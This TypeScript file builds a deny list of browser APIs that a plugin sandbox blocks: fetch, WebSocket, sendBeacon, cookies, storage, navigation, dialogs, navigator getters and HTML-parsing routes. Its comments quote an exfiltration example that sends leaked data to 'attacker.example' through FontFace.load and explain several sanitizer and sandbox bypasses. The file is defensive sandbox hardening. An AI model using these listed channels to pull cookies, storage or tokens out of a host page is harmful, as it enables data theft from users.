export const BLOCKED_NATIVE_REFS = new Map<object, string>();

const method = (proto: object, key: string): object | undefined =>
  Object.getOwnPropertyDescriptor(proto, key)?.value as object | undefined;

const getter = (proto: object, key: string): object | undefined =>
  Object.getOwnPropertyDescriptor(proto, key)?.get;

const setter = (proto: object, key: string): object | undefined =>
  Object.getOwnPropertyDescriptor(proto, key)?.set;

const block = (ref: object | undefined, label: string) => {
  if (ref) {
    BLOCKED_NATIVE_REFS.set(ref, label);
  }
};

// Network exfiltration
block(window.fetch, "window.fetch");
block(window.XMLHttpRequest, "window.XMLHttpRequest");
block(window.WebSocket, "window.WebSocket");
block(window.EventSource, "window.EventSource");
block(window.Worker, "window.Worker");
block(window.SharedWorker, "window.SharedWorker");
block(window.RTCPeerConnection, "window.RTCPeerConnection");
block(method(Navigator.prototype, "sendBeacon"), "Navigator.sendBeacon");

// `new FontFace(family, "url(https://attacker.example/?leak=...)").load()`
// issues a network request the same way `fetch` does. Block until CSP
// `font-src` is tightened (GDGT-2373).
block(method(FontFace.prototype, "load"), "FontFace.load");

// Stylesheet exfiltration. Block both the property accessors and
// the constructable-stylesheet entry points until CSP `font-src`/`img-src`
// is tightened (GDGT-2373). The getter is blocked too because in modern
// browsers `document.adoptedStyleSheets` is a directly-mutable.
// `ObservableArray`, so blocking only the setter would be defeated by
// `document.adoptedStyleSheets.push(sheet)`.
block(
  getter(Document.prototype, "adoptedStyleSheets"),
  "Document.get adoptedStyleSheets",
);
block(
  setter(Document.prototype, "adoptedStyleSheets"),
  "Document.set adoptedStyleSheets",
);
block(
  getter(ShadowRoot.prototype, "adoptedStyleSheets"),
  "ShadowRoot.get adoptedStyleSheets",
);
block(
  setter(ShadowRoot.prototype, "adoptedStyleSheets"),
  "ShadowRoot.set adoptedStyleSheets",
);
block(method(CSSStyleSheet.prototype, "replace"), "CSSStyleSheet.replace");
block(
  method(CSSStyleSheet.prototype, "replaceSync"),
  "CSSStyleSheet.replaceSync",
);

// Document mutation / navigation
block(method(Document.prototype, "write"), "Document.write");
block(method(Document.prototype, "writeln"), "Document.writeln");
block(method(Document.prototype, "open"), "Document.open");
block(method(Document.prototype, "close"), "Document.close");
block(method(Document.prototype, "execCommand"), "Document.execCommand");

// Cookie / domain
block(getter(Document.prototype, "cookie"), "Document.get cookie");
block(setter(Document.prototype, "cookie"), "Document.set cookie");
block(setter(Document.prototype, "domain"), "Document.set domain");

// Storage exfiltration
block(getter(Window.prototype, "localStorage"), "Window.get localStorage");
block(getter(Window.prototype, "sessionStorage"), "Window.get sessionStorage");
block(getter(Window.prototype, "indexedDB"), "Window.get indexedDB");
block(getter(Window.prototype, "caches"), "Window.get caches");

// Window navigation
block(window.open, "window.open");
block(window.close, "window.close");
block(method(Window.prototype, "open"), "window.open");
block(method(Window.prototype, "close"), "window.close");

// UI dialogs — block modal/blocking dialogs initiated by the plugin so it
// can't freeze the host UI or phish via the browser chrome.
block(window.alert, "window.alert");
block(window.confirm, "window.confirm");
block(window.prompt, "window.prompt");
block(window.print, "window.print");
block(method(Window.prototype, "alert"), "window.alert");
block(method(Window.prototype, "confirm"), "window.confirm");
block(method(Window.prototype, "prompt"), "window.prompt");
block(method(Window.prototype, "print"), "window.print");
block(window.Notification, "window.Notification");

// Navigator getters — credential / device leaks
const NAVIGATOR_BLOCKED_GETTERS = [
  "clipboard",
  "geolocation",
  "mediaDevices",
  "serviceWorker",
  "credentials",
  "permissions",
  "usb",
  "bluetooth",
  "share",
  "hid",
  "serial",
  "xr",
  "wakeLock",
  "locks",
  "storage",
  "presentation",
];
for (const key of NAVIGATOR_BLOCKED_GETTERS) {
  block(getter(Navigator.prototype, key), `Navigator.get ${key}`);
}
block(method(Navigator.prototype, "share"), "Navigator.share");

// Location & History
block(method(Location.prototype, "assign"), "Location.assign");
block(method(Location.prototype, "reload"), "Location.reload");
block(setter(Location.prototype, "href"), "Location.set href");
block(method(History.prototype, "pushState"), "History.pushState");
block(method(History.prototype, "replaceState"), "History.replaceState");
block(method(History.prototype, "go"), "History.go");
block(method(History.prototype, "back"), "History.back");
block(method(History.prototype, "forward"), "History.forward");
block(getter(History.prototype, "state"), "History.get state");

// Performance / resource timing — entries expose URLs and timings of every
// resource the host has fetched (including auth-gated API calls)
block(method(Performance.prototype, "getEntries"), "Performance.getEntries");
block(
  method(Performance.prototype, "getEntriesByType"),
  "Performance.getEntriesByType",
);
block(
  method(Performance.prototype, "getEntriesByName"),
  "Performance.getEntriesByName",
);
block(window.PerformanceObserver, "PerformanceObserver");

// HTML parsing — these construct DOM from string input without going through
// the innerHTML/outerHTML/insertAdjacentHTML setters that DOMPurify
// sanitizes, so they'd otherwise be a clean bypass of that mitigation.
block(
  method(Range.prototype, "createContextualFragment"),
  "Range.createContextualFragment",
);
block(
  method(DOMParser.prototype, "parseFromString"),
  "DOMParser.parseFromString",
);
block(method(Element.prototype, "setHTMLUnsafe"), "Element.setHTMLUnsafe");
block(method(Document, "parseHTMLUnsafe"), "Document.parseHTMLUnsafe");

// Programmatic activation — `.click()` on a synthesized <a> can navigate the
// host or trigger a download. Anchor href/target setters skip the
// `setAttribute("href", "javascript:...")` distortion, so block at the
// property setters too.
block(method(HTMLElement.prototype, "click"), "HTMLElement.click");
block(
  setter(HTMLAnchorElement.prototype, "href"),
  "HTMLAnchorElement.set href",
);
block(
  setter(HTMLAnchorElement.prototype, "target"),
  "HTMLAnchorElement.set target",
);

/**
 * Intentionally left out:
 *
 * `OffscreenCanvas`. The main "escape hatch" is `transferControlToOffscreen()`
 * + sending it to a Worker so rendering happens off-thread but Worker/SharedWorker
 * are blocked above, so `OffscreenCanvas` is effectively just an off-DOM canvas you
 * can render into on the main thread, roughly comparable to `document.createElement("canvas")`.
 */
